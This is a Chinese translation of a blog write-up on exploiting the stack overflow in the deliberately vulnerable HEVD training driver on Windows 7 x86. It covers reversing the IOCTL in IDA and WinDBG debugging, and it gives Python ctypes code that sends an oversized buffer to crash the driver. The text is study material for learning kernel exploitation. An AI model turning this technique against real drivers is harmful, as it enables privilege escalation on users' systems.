> 文章翻译自：
## 介绍
继续我们的Windows漏洞利用之旅，开始学习HEVD中内核驱动程序相关的漏洞，并编写有关ring
0的利用程序。正如我在[OSCP](https://h0mbre.github.io/OSCP/)中所做的准备，我主要是在博客中记录自己的进步，以此来加强认知和保留详细的笔记，以供日后参考。
本系列文章是我尝试遍历[Hacksys
Extreme漏洞驱动程序](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)中所有漏洞方法的记录。  
**我将使用HEVD 2.0。** ，对我们这些刚入门的人来说，像这样的训练工具是非常神奇的。 那里还有很多不错的博客文章，介绍了各种HEVD漏洞。
我建议您全部阅读！ 在尝试完成这些攻击时，我大量引用了它们。 在此博客中，我所做的或说的，几乎没有什么是新的内容或我自己的想法/思路/技术。
### **本系列文章不再着重介绍以下信息，例如：**
>   * 驱动程序如何工作，以及用户空间，内核和驱动程序之间的不同类型，如何通信等等
>
>   * 如何安装HEVD
>
>   * 如何搭建实验环境
>
>   * shellcode分析
>
>
原因很简单，其他博客文章在详细说明此信息方面，做得比我更好。 那里有很多出色的帖子，相比之下我写这个博客系列就很肤浅了。
但并不意味着我的博客写得很差，因为我的博客比那些文章更容易理解。那些博客的作者比我有更多的经验和更渊博的知识，他们文章解释的就很好。:)
这篇文章/系列文章将重点放在我尝试制作实际漏洞的经验上。
我使用以下博客作为参考：
>   * [@r0otki7的内核驱动程序安装和实验环境搭建](https://rootkits.xyz/blog/2017/06/kernel-> setting-up/),
>
>   * [@r0otki7的Win7 x86 HEVD 栈溢出](https://rootkits.xyz/blog/2017/08/kernel-> stack-overflow/),
>
>   * [@33y0re的Win7 x86 HEVD
> 栈溢出](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/),
>
>   * [@_xpn_的Win10 x64 HEVD 栈溢出](https://blog.xpnsec.com/hevd-stack-> overflow/),
>
>   * @sizzop的基于HEVD 栈溢出的[bug](https://sizzop.github.io/2016/07/06/kernel-> hacking-with-hevd-part-2.html),
> [shellcode](https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-> part-3.html), 和 [exploit](https://sizzop.github.io/2016/07/08/kernel-> hacking-with-hevd-part-4.html),
>
>   * [@ctf_blahcat的Win8.1 x64 HEVD
> 栈溢出](https://blahcat.github.io/2017/08/18/first-exploit-in-windows-kernel-> hevd/),
>
>   *
> [@abatchy17’的x86和x64环境下利用Token窃取Shellcode](https://www.abatchy.com/2018/01/kernel-> exploitation-2),
>
>   *
> [@hasherezade的HEVD博客文章](https://hshrzd.wordpress.com/2017/06/05/starting-> with-windows-kernel-exploitation-part-2/).
>
>
非常感谢这些博客作者，没有您的帮助，我无法完成前两个漏洞。
## 目标
* * *
我们的目标是在Win7 x86和Win7 x86-64上完成针对HEVD栈溢出漏洞的攻击。
我们将紧跟上述博客文章，但会尝试一些稍有不同的方法，使这个过程变得更加有趣并确保我们能实际学习到知识。。
在挑战这个目标之前，我从未使用过64位的架构。我认为最好先从老式的堆栈溢出漏洞开始学习，因此有关x64的漏洞利用，我们将在本系列文章的第二部分完成。
## Windows 7 x86漏洞利用
* * *
### 开始
HEVD有一个[kernel-mode](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/types-of-windows-drivers)  
驱动程序的例子，以kernel/ring-0权限运行程序，利用此类服务可能会使权限低的用户将权限提升到`nt authority/system`权限。
开始之前，您需要先阅读一些[MSDN的文档](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/),特别是I/O部分，里面详细介绍了内核模式驱动程序的架构。
Windows的API [DeviceIoControl](https://docs.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-)允许用户空间区的应用程序直接与设备驱动程序进行通信，它的参数之一是`IOCTL`，这有点类似于系统调用，对应驱动程序上的某些编程函数和例程。
例如，如果您从用户空间向其发送代码`1`，则设备驱动程序将会有对应的逻辑来解析`IOCTL`，然后执行相应的函数。
如果要与驱动程序进行交互，就需要使用`DeviceIoControl`。
### 设备IO控制
让我们继续看一下MSDN上的`DeviceIoControl`API定义：
    BOOL DeviceIoControl(
      HANDLE       hDevice,
      DWORD        dwIoControlCode,
      LPVOID       lpInBuffer,
      DWORD        nInBufferSize,
      LPVOID       lpOutBuffer,
      DWORD        nOutBufferSize,
      LPDWORD      lpBytesReturned,
      LPOVERLAPPED lpOverlapped
    );
可以看到，`hDevice`是驱动程序的句柄，需要使用单独的API调用`CreateFile`来打开驱动程序的句柄。让我们看一下其定义：
    HANDLE CreateFileA(
      LPCSTR                lpFileName,
      DWORD                 dwDesiredAccess,
      DWORD                 dwShareMode,
      LPSECURITY_ATTRIBUTES lpSecurityAttributes,
      DWORD                 dwCreationDisposition,
      DWORD                 dwFlagsAndAttributes,
      HANDLE                hTemplateFile
    );
通常，与这些API交互时，需要使用C或C ++编写应用程序；
但是，我们可以直接使用python的`ctypes`库，该库提供和C语言兼容的数据类型，可以直接调用动态链接库中的导出函数。虽然有多种方法满足`CreateFileA`的参数需要，但是我们这里使用十六进制代码。
（还用我正在使用Python2.7，因为我讨厌在代码开发过程中弄混Python3中新的str和byte数据类型。此外，如果代码要将其移植到Python3，需要注意这些Windows
API需要某些字符串编码格式。如果没考虑到Python3中将字符串视为Unicode，则`CreateFileA`会失败。
我将解释一些我认为需要阐明的参数，然后其余部分留给读者去研究。不要只是学习表面上的知识，而要真正理解它们的含义。
我仅仅通过在Windows上进行了一些入门级的shell编码就熟悉了其中的一些API，但与专家还相距甚远。我发现通过跟踪调用API的示例并查看它们的代码是最有用的。
我们需要的第一个值是`lpFileName`, 访问HEVD源代码找到它。但是，我认为最好将源代码当作一个黑匣子来处理。 我们将在IDA Free
7.0中打开`.sys`文件，并查看是否可以对其进行跟踪。
在IDA中打开文件后，将会直接跳转到`DriverEntry`函数。
可以看到，在第一个函数中有一个字符串，含有`lpFileName`, `\\ Device \\
HackSysExtremeVulnerableDriver`。
在我们的Python代码中，它将会被格式为`"\\\\.\\HackSysExtremeVulnerableDriver"`。
你可以在google上找到更多关于这个值的信息，以及如何格式化它。
接下来是`dwDesiredAccess`参数。在Rootkit's [blog](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-mask-format?redirectedfrom=MSDN)我们看到他使用了`0xC0000000`值。这可以通过检查访问掩码格式文档并查找相应的潜在值来解释.
我们要使最高有效位（最左边）设置为`C`或十进制`12`。
我们可以看看[winnt.h](https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h)来确定此常数的含义。我们在这里看到`GENERIC_READ`和`GENERIC_WRITE`分别是`0x80000000`和`0x40000000`。
`0xC0000000`就是将这两个值加在一起。这样看起来就很直观！
我想你能算出其他的参数。此时，我们的`CreateFileA`和利用代码是这样的:
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    kernel32 = windll.kernel32
    def create_file():
        hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
        if (not hevd) or (hevd == -1):
            print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
            sys.exit(1)
        else:
            print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
            return hevd
如果成功，CreateFileA将返回一个句柄给我们的设备，如果失败，CreateFileA将给我们一个错误代码。现在，我们有了句柄，可以完成`DeviceIoControl`的调用。
### IOCTLs
在句柄(hevd)之后, 紧接着就是我们需要的`dwIoControlCode`。IDA中显式注释的IOCTL以十进制表示。[RE Stack
Exchange](https://reverseengineering.stackexchange.com/questions/15283/ioctl-code-for-windows-driver)这篇文章详细介绍了其中细微的区别。
这里有一个在[MSDN](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code)上非常有名的宏`CTL_CODE`，驱动程序开发人员可以使用它来生成完整的IOCTL代码。我已经放了一个小脚本，逆向这个过程，从完整的`IOCTL`代码中获取`CTL_CODE`参数,
在[这里](https://github.com/h0mbre/ioctl.py)可以找到。使用来自RE Stack
Exchange的示例，我们可以在这里演示它的输出：
    root@kali:~# ./ioctl.py 0x2222CE
    [*] Device Type: FILE_DEVICE_UNKNOWN
    [*] Function Code: 0x8b3
    [*] Access Check: FILE_ANY_ACCESS
    [*] I/O Method: METHOD_OUT_DIRECT
    [*] CTL_CODE(FILE_DEVICE_UNKNOWN, 0x8b3, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
我们现在需要找到在HEVD中存在的`IOCTL`。我们将再一次使用IDA。
在functions选项中，有一个`IrpDeviceIoCtlHandler`函数，需要解开该函数才能确定哪些IOCTL与哪个函数相对应。
在IDA中打开该函数并向里跟踪，直到找到所需的函数为止，如下所示：
从这里开始，我所做的只是向后追溯路径，直到找到足够的信息以查看需要发送哪些IOCTL才能到达该位置。向后退一级，我们到达这里：
可以看到其中一个寄存器EAX减去了`0x222003` ，如果结果为零，则跳到我们想要的函数。由此可以基本看出，如果发送IOCTL
`0x222003`，我们将最终获得所需的函数。但那太容易了,
让我们回到`IrpDeviceIoCtlHandler`入口，看看是否可以确定有关`IOCTL`解析逻辑的更多信息，并从逻辑上检查我们的工作，甚至不需要与驱动程序进行交互。
在某些时候，我们的IOCTL被加载到`ECX`中，然后与`0x222027`进行比较。 如果`ECX`的值更大，则采用绿色分支（即`JA ==
jump`）, 如果输入的值较小，则采用红色分支。 我们假定IOCTL的值更小，因此我们以红色表示，并在此处结束：
上面这个方框所做的就是，如果我们刚才比较`ECX`和`0x222027`的值是相等的时候，我们将采用绿色。但是，我并不会让它们相等，所以我们再次进入红色分支：
这个比较棘手, 我们知道`EAX`的值`0x222027`，加上`0xFFFFFFEC`即可获得`0x100222013`。
不过，这将是一个额外的字节（9个字节），我们的寄存器将会忽略`0x100222013`的首位`1`。因此我们在EAX中使用`0x222013`，然后将存储在ECX中的`0x222003`与该值进行比较，会使我们再次进入红色分支，因为我们不会超过`EAX`中的新值`0x222013`。所以，接下来的两个方框是：
之前的比较不会以设置`ZERO FLAG`结束，因此从第一个方框中我们将红色移到图片中的第二个方框，瞧！ 我们回到想要的功能上方的方框中。
我们能够从逻辑上跟踪被解析的IOCTL的流程，而无需启动驱动程序。 这样的逆向过程，对于像我这样的菜鸟来说真是太棒了。
现在我们知道了，我们的IOCTL的值是`0x222003`。
剩下的参数可以参考[ootkit blog](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/), 填充大量的“A”字符，下面是我们的漏洞利用代码：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    def create_file():
        hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
        if (not hevd) or (hevd == -1):
            print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
            sys.exit(1)
        else:
            print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
            return hevd
    def send_buf(hevd):
        buf = "A" * 3000
        buf_length = len(buf)
        print("[*] Sending payload to driver...")
        result = kernel32.DeviceIoControl(
            hevd,
            0x222003,
            buf,
            buf_length,
            None,
            0,
            byref(c_ulong()),
            None
        )
    hevd = create_file()
    send_buf(hevd)
## Crash
**通过上述实验步骤了解了内核调试的逻辑**
接着我们需要在受害者机器上运行此程序，同时在其他Win7主机（调试器）上对其进行内核调试。
一旦与调试器上的受害者建立了连接，就可以在WinDBG中运行以下命令：
>   * sympath \ +  
>   * .reload 
>   * ed Kd_DEFAULT_Mask 8 
>   * bp HEVD!TriggerStackOverflow 
>
在调试器上，按`Ctrl` \+ `Break`进行暂停，然后在交互式提示符“kd>”中输入这些命令。
输入这些命令并加载符号和路径（可能需要一段时间）后，使用`g`恢复执行。因为我们是正确的使用IOCTL，所以我们运行代码将会到达断点。
可以看到，程序运行到了断点对应函数，IOCTL是正确的。我们可以使用p一步一步地进入这个函数，一次一条指令。按一次p键，然后可以使用`enter`作为快捷方式，因为它将重复您的上一个命令。
我们也可以转到View，然后选择跟随`EIP`的反汇编，并实时向您显示汇编指令和寄存器。 在某个时候，我们的机器会crash。